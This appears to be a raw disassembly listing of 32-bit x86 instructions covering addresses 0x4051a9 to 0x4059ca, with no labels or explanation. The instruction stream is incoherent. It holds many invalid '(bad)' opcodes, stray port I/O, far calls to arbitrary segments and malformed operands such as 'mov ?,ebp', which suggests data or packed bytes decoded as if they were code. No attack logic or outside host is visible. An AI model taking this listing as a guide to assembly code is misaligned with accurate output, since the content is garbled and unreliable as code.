  4051a9:	and    bh,al
  4051ab:	mov    BYTE PTR [esi+0x242cc3f2],0x27
  4051b2:	mov    ds:0x72b77206,eax
  4051b7:	test   DWORD PTR [ecx+0x6aa0bd9],edx
  4051bd:	into   
  4051be:	ror    DWORD PTR [ebx-0x702636a0],0x2e
  4051c5:	and    dh,BYTE PTR [ebp+0x225d450e]
  4051cb:	fidiv  DWORD PTR [ebp+0x47]
  4051ce:	xchg   esi,eax
  4051cf:	cmp    DWORD PTR [ebx-0x15dfbaea],edi
  4051d5:	pop    esi
  4051d6:	aaa    
  4051d7:	sbb    DWORD PTR ds:0xd32ddbd3,esp
  4051dd:	jb     0x405189
  4051df:	ror    DWORD PTR [ecx],cl
  4051e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051e2:	mov    al,ds:0xc6ab36dd
  4051e7:	jg     0x40520c
  4051e9:	imul   esp,DWORD PTR [ebx+ebp*1+0x2],0xb41dcd9
  4051f1:	push   esp
  4051f2:	outs   dx,BYTE PTR ds:[esi]
  4051f3:	shr    BYTE PTR [esi+0x46],0x39
  4051f7:	call   0xa854:0x56d8e84a
  4051fe:	icebp  
  4051ff:	xchg   esp,eax
  405200:	sub    DWORD PTR [esi+eiz*8-0x587fd76e],0xdfb50a9d
  40520b:	jge    0x40518e
  40520d:	sahf   
  40520e:	ss mov esp,0x5a9140a6
  405214:	sar    esi,0x29
  405217:	call   DWORD PTR fs:[esi+0x7a]
  40521b:	bound  edx,QWORD PTR [esi]
  40521d:	out    dx,al
  40521e:	imul   esp,DWORD PTR [edx],0x894b9cb6
  405224:	stos   BYTE PTR es:[edi],al
  405225:	ins    DWORD PTR es:[edi],dx
  405226:	outs   dx,BYTE PTR ds:[esi]
  405227:	jmp    0x405296
  405229:	or     eax,0xad77526e
  40522e:	cmp    al,ch
  405230:	jg     0x405296
  405232:	out    0x4c,eax
  405234:	mov    ?,ebp
  405236:	cmp    DWORD PTR [edi],esi
  405238:	jnp    0x405224
  40523a:	jb     0x40528a
  40523c:	lea    ebp,[edi-0x74]
  40523f:	jp     0x4052a4
  405241:	aaa    
  405242:	cmc    
  405243:	mov    edi,0x44c28832
  405248:	xor    al,0x2a
  40524a:	or     al,0x15
  40524c:	fstp   QWORD PTR [edx]
  40524e:	sub    ch,BYTE PTR [esi*1-0x6840323f]
  405255:	data16 cmc 
  405257:	clc    
  405258:	scas   al,BYTE PTR es:[edi]
  405259:	sbb    eax,0xf4ac2b31
  40525e:	jnp    0x40524c
  405260:	push   0x8d157b5b
  405265:	dec    esi
  405266:	shl    BYTE PTR [eax-0x1],0xea
  40526a:	and    DWORD PTR [ecx+ecx*4],ecx
  40526d:	push   edi
  40526e:	ja     0x4051f2
  405270:	cmp    DWORD PTR [ecx],edi
  405272:	sbb    BYTE PTR [ebp+0x2c],al
  405275:	pop    esp
  405276:	(bad)  
  405277:	std    
  405278:	cwde   
  405279:	pusha  
  40527a:	fisub  WORD PTR [esi+0x11e388fc]
  405280:	dec    edi
  405281:	adc    DWORD PTR gs:[eax-0x3],0x7f8f2274
  405289:	mov    ch,0x3c
  40528b:	fstp   QWORD PTR [edx-0x6c]
  40528e:	aad    0x93
  405290:	xor    al,0xc1
  405292:	sbb    al,bh
  405294:	xchg   ebx,eax
  405295:	std    
  405296:	or     al,0xa3
  405298:	push   ss
  405299:	xor    al,0x80
  40529b:	sahf   
  40529c:	lahf   
  40529d:	push   0xa2c5c68b
  4052a2:	cli    
  4052a3:	inc    edi
  4052a4:	add    eax,0x20c5f33f
  4052a9:	inc    edi
  4052aa:	sub    dh,BYTE PTR [eax]
  4052ac:	pop    ebx
  4052ad:	daa    
  4052ae:	mov    ?,WORD PTR [ecx+0x32]
  4052b1:	inc    edx
  4052b2:	push   ds
  4052b3:	loope  0x405253
  4052b5:	inc    edi
  4052b6:	push   ss
  4052b7:	in     al,0x14
  4052b9:	xchg   esi,eax
  4052ba:	test   eax,0x83af27f6
  4052bf:	bound  ebp,QWORD PTR [ecx+0x44]
  4052c2:	ds push cs
  4052c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052c5:	dec    ebp
  4052c6:	adc    BYTE PTR [ecx],al
  4052c8:	pop    esi
  4052c9:	jnp    0x40534a
  4052cb:	imul   ecx,eax,0xb0ecb402
  4052d1:	mov    edi,0x69e20f77
  4052d6:	sub    al,0x7e
  4052d8:	xchg   esi,eax
  4052d9:	dec    ebp
  4052da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052db:	test   BYTE PTR [edx],ah
  4052dd:	in     eax,dx
  4052de:	mov    ds:0x29c047a7,eax
  4052e3:	loop   0x405354
  4052e5:	adc    al,cl
  4052e7:	jo     0x40527f
  4052e9:	add    bl,0xd1
  4052ec:	mov    BYTE PTR [ebp+0x2fdce796],al
  4052f2:	lods   eax,DWORD PTR ds:[esi]
  4052f3:	loope  0x405317
  4052f5:	inc    eax
  4052f6:	dec    esp
  4052f7:	adc    esi,ebp
  4052f9:	mov    ebx,0xa27cfa2
  4052fe:	fwait
  4052ff:	arpl   bx,dx
  405301:	sbb    BYTE PTR [eax],0xb2
  405304:	jge    0x4052f5
  405306:	fisubr DWORD PTR [ebp+0x44]
  405309:	popa   
  40530a:	mov    esp,0x2129bf66
  40530f:	sbb    BYTE PTR [ebp+0x15],dh
  405312:	sbb    eax,DWORD PTR [esi]
  405314:	mov    eax,ds:0xbd622ec5
  405319:	mov    ecx,0x2793c4a5
  40531e:	mov    eax,0x417b76ee
  405323:	ret    0x2466
  405326:	rcl    DWORD PTR [edi-0x3ac2f8d0],1
  40532c:	mov    ebp,0x123d8bcd
  405331:	add    bh,BYTE PTR [eax]
  405333:	scas   eax,DWORD PTR es:[edi]
  405334:	xchg   ebp,eax
  405335:	int    0x9b
  405337:	add    al,0x49
  405339:	and    al,0xf4
  40533b:	fwait
  40533c:	les    ebp,FWORD PTR [eax]
  40533e:	push   0x9507f3fb
  405343:	or     dl,BYTE PTR [edi-0x5373ef73]
  405349:	loope  0x405338
  40534b:	xor    al,0x72
  40534d:	std    
  40534e:	dec    esp
  40534f:	push   edi
  405350:	jno    0x4052de
  405352:	add    DWORD PTR [esi+0x654c7c49],ebp
  405358:	push   edi
  405359:	xchg   al,bl
  40535b:	call   0xd9854ae
  405360:	cmp    BYTE PTR [edi],cl
  405362:	xor    ebx,DWORD PTR [edi-0x21d5707f]
  405368:	lea    ecx,[edi-0x32]
  40536b:	(bad)  
  40536d:	cdq    
  40536e:	test   al,0x59
  405370:	pushf  
  405371:	xor    DWORD PTR [edi],edi
  405373:	xchg   ecx,eax
  405374:	inc    edx
  405375:	lea    ebp,[edi+0x1289fad0]
  40537b:	(bad)  
  40537c:	test   al,0x87
  40537e:	imul   eax,DWORD PTR [eax],0x9e0b3a30
  405384:	adc    ch,BYTE PTR [edi]
  405386:	dec    ecx
  405387:	inc    ecx
  405388:	mov    dh,0x17
  40538a:	ror    DWORD PTR [ecx],1
  40538c:	mov    edx,0xcd2535d8
  405391:	push   0x3e549c13
  405396:	sub    dh,0x80
  405399:	mov    bh,0x91
  40539b:	jno    0x405414
  40539d:	mov    ebp,ss
  40539f:	aaa    
  4053a0:	xlat   BYTE PTR ds:[ebx]
  4053a1:	mov    dh,0xce
  4053a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a4:	mov    cl,BYTE PTR [edx+0x3d]
  4053a7:	mov    WORD PTR [edx+0x626bbca7],es
  4053ad:	inc    esp
  4053ae:	in     al,0xac
  4053b0:	sbb    BYTE PTR [esi],ch
  4053b2:	sub    esp,DWORD PTR [ebx*4-0x3a81bfda]
  4053b9:	push   ss
  4053ba:	xchg   edx,eax
  4053bb:	add    dl,al
  4053bd:	push   ebp
  4053be:	or     edx,0xffffffe4
  4053c1:	in     al,0x2b
  4053c3:	cmp    al,0x93
  4053c5:	out    0xd0,eax
  4053c7:	ss das 
  4053c9:	push   eax
  4053ca:	adc    al,0x82
  4053cc:	pop    esi
  4053cd:	test   BYTE PTR [edi],dl
  4053cf:	clc    
  4053d0:	out    0x4c,eax
  4053d2:	xchg   ebx,eax
  4053d3:	(bad)  
  4053d4:	pop    ss
  4053d5:	cwde   
  4053d6:	jp     0x40541a
  4053d8:	fisttp WORD PTR [ebx]
  4053da:	fidiv  DWORD PTR gs:[eax]
  4053dd:	data16 (bad) 
  4053df:	in     al,0x1
  4053e1:	dec    edi
  4053e2:	dec    ebp
  4053e3:	pop    ebx
  4053e4:	addr16 inc ecx
  4053e6:	(bad)  [ebx+eax*4]
  4053e9:	jo     0x405452
  4053eb:	dec    esp
  4053ec:	add    BYTE PTR [ecx-0x6d],ah
  4053ef:	jne    0x405399
  4053f1:	arpl   WORD PTR [ebx-0x6b0492c0],dx
  4053f7:	cmp    dh,BYTE PTR [ecx]
  4053f9:	inc    esi
  4053fa:	sub    eax,0xa00cdb21
  4053ff:	call   0x5b8e:0x7fb20d22
  405406:	loope  0x405411
  405408:	jae    0x40543f
  40540a:	sbb    al,0xa8
  40540c:	retf   
  40540d:	jmp    0x405453
  40540f:	cmp    DWORD PTR [ecx+eax*8-0x58],ecx
  405413:	add    ebp,ecx
  405415:	add    al,0x9c
  405417:	imul   eax,DWORD PTR [esi+0x3b8d0a39],0xffffffd9
  40541e:	iret   
  40541f:	pusha  
  405420:	cmp    BYTE PTR [ebp+0x6f5c5df3],cl
  405426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405427:	push   ecx
  405428:	add    al,0x17
  40542a:	and    esi,edi
  40542c:	jno    0x4053b2
  40542e:	sub    DWORD PTR [eax],eax
  405430:	cdq    
  405431:	icebp  
  405432:	jo     0x405414
  405434:	ja     0x405412
  405436:	pop    esp
  405437:	retf   0xa448
  40543a:	call   0xd8f9:0xf8b352e4
  405441:	sub    ch,0x84
  405444:	ja     0x405457
  405446:	jge    0x4054b6
  405448:	inc    eax
  405449:	pop    ss
  40544a:	and    bh,BYTE PTR [edx+0x6a]
  40544d:	cdq    
  40544e:	or     BYTE PTR [esi],bh
  405450:	mov    BYTE PTR [eax+0x1],ah
  405453:	arpl   sp,si
  405455:	popa   
  405456:	push   0x5c
  405458:	jae    0x4054a8
  40545a:	jmp    0x8af55740
  40545f:	mov    dl,0x7c
  405461:	sub    al,0x27
  405463:	xchg   esp,eax
  405464:	stos   BYTE PTR es:[edi],al
  405465:	out    0xf8,al
  405467:	scas   al,BYTE PTR es:[edi]
  405468:	aaa    
  405469:	jno    0x40540c
  40546b:	sbb    eax,0x78930def
  405470:	push   eax
  405471:	out    dx,eax
  405472:	jmp    0x4054b7
  405474:	jne    0x40545f
  405476:	sub    BYTE PTR [edx+0x47],0xb3
  40547a:	add    al,0x7c
  40547c:	jne    0x40541c
  40547e:	aad    0x1c
  405480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405481:	dec    esp
  405482:	dec    edx
  405483:	enter  0x72a0,0x16
  405487:	repnz in al,0xe5
  40548a:	xor    al,0x3f
  40548c:	rcl    DWORD PTR [ecx+0x7c],1
  40548f:	jg     0x405466
  405491:	or     eax,0xdc837daf
  405496:	fld    QWORD PTR [ebx+0x109d74bc]
  40549c:	dec    ebx
  40549d:	stc    
  40549e:	enter  0x790e,0xc0
  4054a2:	dec    ecx
  4054a3:	(bad)  
  4054a4:	sub    al,0xb9
  4054a6:	loope  0x405497
  4054a8:	add    edi,DWORD PTR [ecx]
  4054aa:	mov    edi,0xa3654fff
  4054af:	adc    DWORD PTR [edi],0x70
  4054b2:	(bad)  
  4054b3:	pop    ecx
  4054b4:	cmp    ebx,eax
  4054b6:	pop    edi
  4054b7:	clc    
  4054b8:	xchg   edi,eax
  4054b9:	pop    edi
  4054ba:	aaa    
  4054bb:	xor    eax,0x632ed8b8
  4054c0:	sti    
  4054c1:	cmp    DWORD PTR [esi+eax*1+0x73],ebx
  4054c5:	add    ax,0xa92f
  4054c9:	xchg   esp,eax
  4054ca:	cli    
  4054cb:	push   esp
  4054cc:	cmp    BYTE PTR ds:0xe57c218a,0x55
  4054d3:	sbb    eax,0x15f4bf7d
  4054d8:	inc    BYTE PTR [ebx-0x1b58a47f]
  4054de:	(bad)  
  4054df:	(bad)  
  4054e0:	mov    al,0x8e
  4054e2:	pop    eax
  4054e3:	arpl   WORD PTR [edi-0x2785e914],ax
  4054e9:	mov    eax,0xa629bbc1
  4054ee:	mov    dh,BYTE PTR [ebx-0x22]
  4054f1:	repnz lea esi,[esi+esi*1-0x4a]
  4054f6:	cmp    BYTE PTR [ecx-0x76],ch
  4054f9:	mov    dh,0x78
  4054fb:	test   eax,0x7dd62cbb
  405500:	jb     0x40554d
  405502:	mov    edx,0x48fc7473
  405507:	sbb    BYTE PTR [ebx+0x95409c7],ah
  40550d:	or     BYTE PTR [ecx+0x4ef2d937],dl
  405513:	xchg   esp,eax
  405514:	mov    ebp,cs
  405516:	jae    0x40554d
  405518:	dec    ecx
  405519:	mov    ebp,0xa5927183
  40551e:	shr    dh,1
  405520:	adc    esi,edi
  405522:	mov    ebp,0xd8927dd6
  405527:	cmp    ch,dh
  405529:	xor    edi,edx
  40552b:	popa   
  40552c:	(bad)  
  40552d:	sti    
  40552e:	xchg   esp,eax
  40552f:	xor    BYTE PTR [ebx-0x4bafbc7d],bl
  405535:	jle    0x405536
  405537:	ss mov edx,0xc816fe60
  40553d:	xlat   BYTE PTR gs:[ebx]
  40553f:	push   edx
  405540:	mov    eax,0x9c257263
  405545:	jne    0x4054da
  405547:	xor    al,0x96
  405549:	iret   
  40554a:	dec    BYTE PTR [ebx+ecx*2-0x62]
  40554e:	mov    edi,0xef135f47
  405553:	pop    ecx
  405554:	aam    0xab
  405556:	popf   
  405557:	jns    0x4055d2
  405559:	mov    ?,WORD PTR [eax-0xcdfc0f9]
  40555f:	push   es
  405560:	mov    ds:0x1ce54575,al
  405565:	push   0xa186b937
  40556a:	ret    
  40556b:	push   ebp
  40556c:	mov    esp,0xc0307644
  405571:	and    BYTE PTR [ecx],dl
  405573:	cmp    ebp,edx
  405575:	and    ebx,edx
  405577:	or     cl,dh
  405579:	push   ebx
  40557a:	xchg   BYTE PTR [eax],bh
  40557c:	mov    BYTE PTR [eax-0x653091d6],ah
  405582:	call   0x922efaef
  405587:	aas    
  405588:	ds retf 
  40558a:	mov    eax,0x2443f19a
  40558f:	sahf   
  405590:	out    0x0,eax
  405592:	ret    0xe58e
  405595:	in     eax,0xa2
  405597:	or     ecx,DWORD PTR [ecx-0x3736a3f7]
  40559d:	dec    eax
  40559e:	xor    DWORD PTR [edx-0x1e],ebp
  4055a1:	sar    edx,1
  4055a3:	lds    eax,FWORD PTR [ecx-0x72]
  4055a6:	dec    ebx
  4055a7:	loop   0x4055e4
  4055a9:	or     BYTE PTR [ebx+0x5cf872d6],dl
  4055af:	fild   DWORD PTR [edi+0x136dc297]
  4055b5:	cmp    esp,DWORD PTR [esi]
  4055b7:	loope  0x405633
  4055b9:	repnz pop es
  4055bb:	setne  BYTE PTR [esi+0x7fda4af5]
  4055c2:	pop    es
  4055c3:	lahf   
  4055c4:	jnp    0x40560e
  4055c6:	das    
  4055c7:	or     bl,cl
  4055c9:	fadd   st,st(0)
  4055cb:	dec    esp
  4055cc:	mov    eax,0x41d2e654
  4055d1:	int    0x7f
  4055d3:	jg     0x405588
  4055d5:	in     eax,dx
  4055d6:	mov    esp,0xe9043b4b
  4055db:	imul   esp,DWORD PTR [ebx-0x3eb641aa],0xf9305beb
  4055e5:	sbb    dh,BYTE PTR [eax+0x2eac7dae]
  4055eb:	test   eax,0xcfab2d6a
  4055f0:	pushf  
  4055f1:	scas   al,BYTE PTR es:[edi]
  4055f2:	jns    0x40565a
  4055f4:	xor    eax,0xa12068e4
  4055f9:	add    bh,BYTE PTR [esi+0x61]
  4055fc:	fs pop ebp
  4055fe:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  405600:	mov    eax,0xbaaba5ae
  405605:	or     esi,DWORD PTR [esi]
  405607:	sub    ebx,DWORD PTR [ecx-0x37f1ecf8]
  40560d:	add    BYTE PTR es:[edi+ebx*4],dh
  405611:	mov    BYTE PTR [edx-0x2],0x5d
  405615:	add    eax,0x67511386
  40561a:	add    ah,0x55
  40561d:	sbb    eax,0x66174c0f
  405622:	fcmovnbe st,st(5)
  405624:	add    eax,ecx
  405626:	mov    dh,0x56
  405628:	xor    BYTE PTR [ebx+0x5a5c8df5],bl
  40562e:	mov    bh,0x3d
  405630:	push   ss
  405631:	lea    ebx,[ecx+0x5]
  405634:	or     al,0x1c
  405636:	les    esi,FWORD PTR [edi-0x7b]
  405639:	mov    DWORD PTR [ebx-0x14],ebp
  40563c:	bound  ebp,QWORD PTR [esi]
  40563e:	push   ds
  40563f:	lods   eax,DWORD PTR ds:[esi]
  405640:	pop    ss
  405641:	add    BYTE PTR [ebx+0x7759ae16],ah
  405647:	xor    BYTE PTR [edi+0x54],dl
  40564a:	data16 fsubr DWORD PTR [eax-0x107bf80]
  405651:	daa    
  405652:	mov    ds:0x2c4022cd,al
  405657:	ror    BYTE PTR [edi],cl
  405659:	push   0xe
  40565b:	jmp    0xe2e3:0xbedbc7ed
  405662:	mov    ecx,0x5b344941
  405667:	or     DWORD PTR [ebp+0x49696ad5],0x3b
  40566e:	popf   
  40566f:	out    0x2f,al
  405671:	jp     0x40566e
  405673:	xchg   ecx,eax
  405674:	add    DWORD PTR [esi-0x5ff8ca07],edx
  40567a:	daa    
  40567b:	int3   
  40567c:	adc    BYTE PTR ss:[eax],al
  40567f:	test   al,0xba
  405681:	lods   eax,DWORD PTR ds:[esi]
  405682:	and    al,0xe5
  405684:	and    esp,esi
  405686:	xchg   BYTE PTR [eax-0x5e11a031],dh
  40568c:	jns    0x40561a
  40568e:	jmp    0xbac48e5f
  405693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405694:	sbb    DWORD PTR [edx+0x57031597],ebp
  40569a:	rol    DWORD PTR [ecx+0x541b07d3],0x13
  4056a1:	dec    BYTE PTR [esi]
  4056a3:	pop    ebp
  4056a4:	pusha  
  4056a5:	mov    eax,0x990a9c06
  4056aa:	in     eax,0x1c
  4056ac:	das    
  4056ad:	call   0x30d95770
  4056b2:	mov    esp,0x51efe918
  4056b7:	and    dl,ah
  4056b9:	(bad)  
  4056ba:	and    al,0x1
  4056bc:	push   0xffffffb2
  4056be:	arpl   ax,bx
  4056c0:	mov    dl,0x1f
  4056c2:	iret   
  4056c3:	in     al,0xcc
  4056c5:	pop    ds
  4056c6:	pop    edi
  4056c7:	shl    BYTE PTR [edi-0x3c],1
  4056ca:	push   ebp
  4056cb:	arpl   WORD PTR [esi-0x58],ax
  4056ce:	xor    eax,0x38fb7985
  4056d3:	ficomp DWORD PTR [ecx-0x10250fab]
  4056d9:	jle    0x405696
  4056db:	mov    esi,esp
  4056dd:	push   ss
  4056de:	cmp    al,0xb0
  4056e0:	mov    ebx,0x92580bd5
  4056e5:	xchg   ecx,eax
  4056e6:	push   ds
  4056e7:	inc    esp
  4056e8:	fistp  DWORD PTR [ecx+ecx*4+0x3208841c]
  4056ef:	je     0x40576a
  4056f1:	mov    ebp,0xa5e10dfc
  4056f6:	aam    0xc9
  4056f8:	test   dl,bh
  4056fa:	jle    0x4056c9
  4056fc:	pop    eax
  4056fd:	mov    cl,0xb3
  4056ff:	xchg   esi,eax
  405700:	pop    edx
  405701:	add    eax,DWORD PTR [ecx]
  405703:	cli    
  405704:	dec    ebx
  405705:	mov    ds:0x34a1819b,al
  40570a:	in     eax,0xad
  40570c:	fild   WORD PTR [edi-0x62]
  40570f:	push   ss
  405710:	popf   
  405711:	out    dx,eax
  405712:	jno    0x405764
  405714:	mov    eax,ds:0xfdede037
  405719:	bound  ebx,QWORD PTR [ecx-0x13]
  40571c:	mov    ch,0xe2
  40571e:	test   al,0xd7
  405720:	jbe    0x405741
  405722:	ror    eax,1
  405724:	inc    esi
  405725:	aad    0xf6
  405727:	pop    esp
  405728:	clc    
  405729:	adc    al,0xcf
  40572b:	(bad)
  40572f:	(bad)  
  405730:	fdiv   DWORD PTR [ecx-0x9]
  405733:	fisub  WORD PTR [eax+eax*4+0x0]
  405737:	push   ecx
  405738:	adc    ecx,ebp
  40573a:	xor    eax,0xa2159784
  40573f:	sar    DWORD PTR [ebp+esi*4-0x2a55305f],cl
  405746:	dec    ebx
  405747:	sbb    edx,DWORD PTR [esi-0x3099e73e]
  40574d:	xor    ecx,edi
  40574f:	xor    al,0xac
  405751:	sbb    ch,BYTE PTR [esi+0x42]
  405754:	pop    edi
  405755:	(bad)  
  405756:	rol    DWORD PTR [edi-0x1402d5dc],cl
  40575c:	pop    ecx
  40575d:	mov    WORD PTR [eax],ss
  40575f:	pop    eax
  405760:	mov    BYTE PTR [edx+0x41],al
  405763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405764:	and    bh,BYTE PTR [ecx+0x4fcdda04]
  40576a:	add    BYTE PTR [ecx+0x1a3dabbf],0xac
  405771:	dec    edx
  405772:	into   
  405773:	fld    TBYTE PTR [eiz*1+0x5c3c9bcc]
  40577a:	inc    ebp
  40577b:	inc    esi
  40577c:	pop    ecx
  40577d:	shl    BYTE PTR [esi+0x69],cl
  405780:	aaa    
  405781:	push   eax
  405782:	popa   
  405783:	jb     0x4057b7
  405785:	(bad)  
  405786:	outs   dx,DWORD PTR ds:[esi]
  405787:	into   
  405788:	call   FWORD PTR [esi+0x1e]
  40578b:	out    dx,eax
  40578c:	sub    BYTE PTR [esp+edx*4-0x71],cl
  405790:	push   edx
  405791:	mov    ds:0xb5d4790c,al
  405796:	xor    BYTE PTR [di-0x7c45],bl
  40579b:	dec    esi
  40579c:	(bad)  
  40579e:	data16 adc BYTE PTR ds:[eax],cl
  4057a2:	inc    ecx
  4057a3:	pop    ss
  4057a4:	shr    BYTE PTR [ecx+0x46],1
  4057a7:	ins    DWORD PTR es:[edi],dx
  4057a8:	sub    bl,BYTE PTR [ebp+ebx*4+0xbc93afd]
  4057af:	sub    DWORD PTR [ebx],0x68de58e3
  4057b5:	mov    ecx,DWORD PTR [ebx-0x1173900e]
  4057bb:	inc    ecx
  4057bc:	loope  0x40580d
  4057be:	or     dl,BYTE PTR [eax]
  4057c0:	inc    edx
  4057c1:	sahf   
  4057c2:	pushw  es
  4057c4:	bound  edx,QWORD PTR [eax-0x77]
  4057c7:	fsubr  QWORD PTR [bp+si]
  4057ca:	or     eax,0xb5ade8d3
  4057cf:	inc    ebx
  4057d0:	retf   0xc32
  4057d3:	pop    ds
  4057d4:	ins    DWORD PTR es:[edi],dx
  4057d5:	jl     0x4057b2
  4057d7:	push   ecx
  4057d8:	mov    eax,ds:0xeb7a5662
  4057dd:	call   0xd638af48
  4057e2:	loop   0x405830
  4057e4:	lahf   
  4057e5:	xchg   esi,eax
  4057e6:	int    0x3e
  4057e8:	enter  0x7f61,0x24
  4057ec:	pop    ds
  4057ed:	jns    0x405773
  4057ef:	sbb    eax,0xab8639a1
  4057f4:	and    DWORD PTR [ecx-0x21e3e7bf],ebx
  4057fa:	push   esp
  4057fb:	sti    
  4057fc:	repnz ficomp DWORD PTR [eax-0x288f501d]
  405803:	add    BYTE PTR [esi-0x5fe609ce],cl
  405809:	out    dx,al
  40580a:	xchg   esi,eax
  40580b:	in     eax,0x2
  40580d:	adc    al,0x30
  40580f:	mov    ah,0x93
  405812:	ja     0x4057a4
  405814:	arpl   WORD PTR ds:0x82283b56,sp
  40581a:	test   DWORD PTR [ecx],esi
  40581c:	and    dl,BYTE PTR [eax-0x482b38c8]
  405822:	jbe    0x4057c7
  405824:	(bad)  
  405825:	mov    ds:0x2e1c775f,eax
  40582a:	leave  
  40582b:	test   BYTE PTR [eax-0x1e9ba789],bh
  405831:	mov    bl,0x2c
  405833:	dec    esi
  405834:	mov    DWORD PTR [ebp+0x74],eax
  405837:	pop    ss
  405838:	adc    bl,BYTE PTR [edi+0x2d922dd5]
  40583e:	sbb    eax,0xb2e82b8a
  405843:	mov    bh,0xae
  405845:	lods   al,BYTE PTR ds:[esi]
  405846:	in     al,0x6a
  405848:	xchg   esp,eax
  405849:	jno    0x405852
  40584b:	adc    ebx,edx
  40584d:	retf   
  40584e:	xchg   ebp,eax
  40584f:	dec    ecx
  405850:	sub    BYTE PTR [eax],dl
  405852:	xlat   BYTE PTR ds:[ebx]
  405853:	pop    esp
  405854:	jmp    0x405806
  405856:	fdiv   DWORD PTR [ebx+ebx*8]
  405859:	push   0xffffffec
  40585b:	div    DWORD PTR [edi+0x28]
  40585e:	and    DWORD PTR [edx],ebx
  405860:	or     esi,DWORD PTR ds:0x73fc3c1a
  405866:	dec    esi
  405867:	cld    
  405868:	inc    edx
  405869:	push   0x4f93d7b9
  40586e:	pop    di
  405870:	sub    al,0xc1
  405872:	out    dx,eax
  405873:	jae    0x4058e0
  405875:	cld    
  405876:	dec    ebp
  405877:	loope  0x4058a3
  405879:	xchg   ebp,eax
  40587a:	loopne 0x405849
  40587c:	jno    0x4058c4
  40587e:	mov    ah,0xce
  405880:	jg     0x405803
  405882:	mov    esp,0xe4fac68e
  405887:	adc    al,0xbe
  405889:	test   eax,0x27c08f7
  40588e:	cld    
  40588f:	shr    BYTE PTR [ebp-0x5d4c7207],0xe5
  405896:	xchg   edx,eax
  405897:	shl    esp,1
  405899:	cwde   
  40589a:	test   eax,0xb6419afd
  40589f:	popf   
  4058a0:	or     BYTE PTR [esi-0x68],dh
  4058a3:	retf   0xeee4
  4058a6:	out    dx,al
  4058a7:	fwait
  4058a8:	push   ss
  4058a9:	jno    0x40591b
  4058ab:	popa   
  4058ac:	fisubr WORD PTR [ebx+edx*4-0x13ab30c]
  4058b3:	mov    edi,0x7bacf99d
  4058b8:	or     BYTE PTR [esi-0x34a9291d],0xe7
  4058bf:	adc    DWORD PTR [edx],esp
  4058c1:	mov    WORD PTR [esi+0x4e],fs
  4058c4:	iret   
  4058c5:	lea    ebp,[ebx-0x75]
  4058c8:	bound  edi,QWORD PTR [ebx-0xa]
  4058cb:	xchg   ecx,eax
  4058cc:	in     al,dx
  4058cd:	push   eax
  4058ce:	fisttp QWORD PTR [eax+0x6c]
  4058d1:	xchg   BYTE PTR [eax+0x5b],al
  4058d4:	dec    edx
  4058d5:	outs   dx,BYTE PTR ds:[esi]
  4058d6:	out    0xc5,eax
  4058d8:	cwde   
  4058d9:	mov    DWORD PTR [ebp+0x5b118f22],ecx
  4058df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058e0:	pop    ebp
  4058e1:	pusha  
  4058e2:	mov    ebp,0xd350d2fc
  4058e7:	retf   0x7d3f
  4058ea:	(bad)  
  4058eb:	mov    eax,0x2010d010
  4058f0:	dec    esp
  4058f1:	fisttp DWORD PTR [ebx+0x21178401]
  4058f7:	mov    ah,0xa9
  4058f9:	adc    ah,BYTE PTR [ecx-0x64b914a1]
  4058ff:	mov    ebx,es
  405901:	cmp    BYTE PTR [edx+0x30114476],dh
  405907:	cmp    esi,DWORD PTR [ebp-0x41]
  40590a:	cmp    bh,BYTE PTR [esi+edi*1-0x73ad0640]
  405911:	mov    DWORD PTR [ebp+0x70],esp
  405914:	(bad)  
  405916:	arpl   WORD PTR [edx+0x15489451],ax
  40591c:	push   es
  40591d:	jg     0x4058c0
  40591f:	mov    al,ds:0x54db0955
  405924:	sbb    ch,BYTE PTR [esi]
  405926:	jbe    0x4058fc
  405928:	add    ah,BYTE PTR [edx+ebx*2+0x79]
  40592c:	mov    ah,0x97
  40592e:	out    0x9b,eax
  405930:	and    dl,BYTE PTR ds:0x2d7f35a6
  405936:	(bad)  [edx-0x61f12b66]
  40593c:	mov    es:0xbcbc5f19,eax
  405942:	jb     0x405901
  405944:	imul   eax,DWORD PTR [ecx],0x36
  405947:	inc    ebx
  405948:	push   esp
  405949:	or     ah,bl
  40594b:	aad    0x5f
  40594d:	daa    
  40594e:	ins    BYTE PTR es:[edi],dx
  40594f:	dec    edi
  405950:	push   ebx
  405951:	call   0x74638bb7
  405956:	and    BYTE PTR [edi],0xe5
  405959:	stos   BYTE PTR es:[edi],al
  40595a:	jl     0x405941
  40595c:	cdq    
  40595d:	xor    eax,0x4bbd42e1
  405962:	adc    BYTE PTR [edx],dl
  405964:	ins    BYTE PTR es:[edi],dx
  405965:	idiv   DWORD PTR [esi-0x28]
  405968:	jecxz  0x4059ce
  40596a:	sub    BYTE PTR [esi+ebp*8+0xb32402],0xee
  405972:	pop    esi
  405973:	inc    ebp
  405974:	(bad)  
  405975:	std    
  405976:	mov    dh,dh
  405978:	(bad)  
  405979:	or     BYTE PTR [ecx+0x22948bc8],0xec
  405980:	or     eax,0x3b6cdafe
  405985:	or     dh,BYTE PTR ds:0x398a3507
  40598b:	dec    esi
  40598c:	mov    gs,WORD PTR [edx+0x2e]
  40598f:	ins    BYTE PTR es:[edi],dx
  405990:	nop
  405991:	leave  
  405992:	inc    esi
  405993:	(bad)  cs:[edx+0x7c]
  405997:	jmp    0x21ea855b
  40599c:	push   edx
  40599d:	pusha  
  40599e:	loop   0x405944
  4059a0:	adc    eax,0x18bfc913
  4059a5:	inc    edx
  4059a6:	int    0x62
  4059a8:	ins    BYTE PTR es:[edi],dx
  4059a9:	inc    ecx
  4059aa:	ins    BYTE PTR es:[edi],dx
  4059ab:	jnp    0x4059d2
  4059ad:	(bad)  
  4059ae:	and    DWORD PTR [ecx-0x6974e7bf],ecx
  4059b4:	add    al,0xb6
  4059b6:	pop    edi
  4059b7:	leavew 
  4059b9:	jmp    0xa08d5111
  4059be:	imul   ebx,DWORD PTR [ebx],0x84bf3a72
  4059c4:	mov    esi,0x3d634c39
  4059c9:	dec    esi
  4059ca:	mov    al,0xe4
